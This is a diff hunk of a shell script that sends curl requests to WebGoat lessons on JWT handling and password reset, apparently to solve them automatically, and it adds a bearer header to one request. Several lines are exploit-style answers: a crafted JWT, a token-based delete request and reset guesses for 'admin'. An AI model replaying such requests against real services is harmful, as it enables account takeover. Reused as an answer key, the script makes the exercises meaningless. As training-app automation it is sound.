@@ -195,7 +195,7 @@ curl "$1/WebGoat/JWT/decode" -H "Cookie: $COOKIE" -H "Origin: $1" -H "Referer: $
 curl "$1/WebGoat/JWT/quiz" -H "Cookie: $COOKIE" --data 'question_0_solution=Solution+1%3A+Throws+an+exception+in+line+12&question_1_solution=Solution+3%3A+Logs+an+error+in+line+9'
 curl "$1/WebGoat/JWT/quiz" -H "Cookie: $COOKIE"
 curl "$1/WebGoat/JWT/secret" -H "Cookie: $COOKIE" --data 'token=eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY0OTIyMDQxMSwiZXhwIjoxNjQ5MjIwNDcxLCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.jWTlybJdxuWk83XxUkpDob3sxqXMYBJNMUdPLDqf8w4'
-curl -X POST "$1/WebGoat/JWT/refresh/checkout" -H "Cookie: $COOKIE"
+curl -X POST "$1/WebGoat/JWT/refresh/checkout" -H "Cookie: $COOKIE" -H 'Authorization: Bearer test'
 curl "$1/WebGoat/JWT/final/delete?token=123" -X POST -H "Cookie: $COOKIE"
 curl "$1/WebGoat/PasswordReset/simple-mail" -H "Cookie: $COOKIE" --data 'email=usertest&password=123456'
 curl "$1/WebGoat/PasswordReset/questions" -H "Cookie: $COOKIE" --data 'username=admin&securityQuestion=11'
